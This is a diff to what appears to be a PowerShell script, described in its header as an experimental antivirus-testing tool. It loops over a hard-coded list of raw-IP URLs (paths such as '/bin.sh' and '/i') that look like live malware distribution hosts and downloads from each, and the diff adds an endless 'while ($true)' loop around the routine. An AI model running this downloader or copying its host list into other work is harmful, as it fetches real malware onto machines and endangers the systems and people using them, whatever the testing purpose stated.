@@ -3,6 +3,8 @@
 # THE ANTIVIRUS YOU ARE TRYING TO TEST AS IT WILL DECREASE THE TEST'S USEFULNESS. THIS PROGRAM IS UNDER EXPERIMENTATION AND MAY NOT WORK AS INTENDED IF
 # AT ALL. PLEASE KEEP THIS IN MIND WHEN EXECUTING THIS PROGRAM IN YOUR VIRTUAL MACHINE.
 
+while ($true) {
+
 $urls = @(
     "http://222.137.83.24:39926/bin.sh",
     "http://117.252.168.65:36030/i",
@@ -72,4 +74,7 @@ foreach ($url in $urls) {
     } catch {
         Write-Host "Failed to download file: $url"
     }
+}
+
+# Arth-End loop
 }
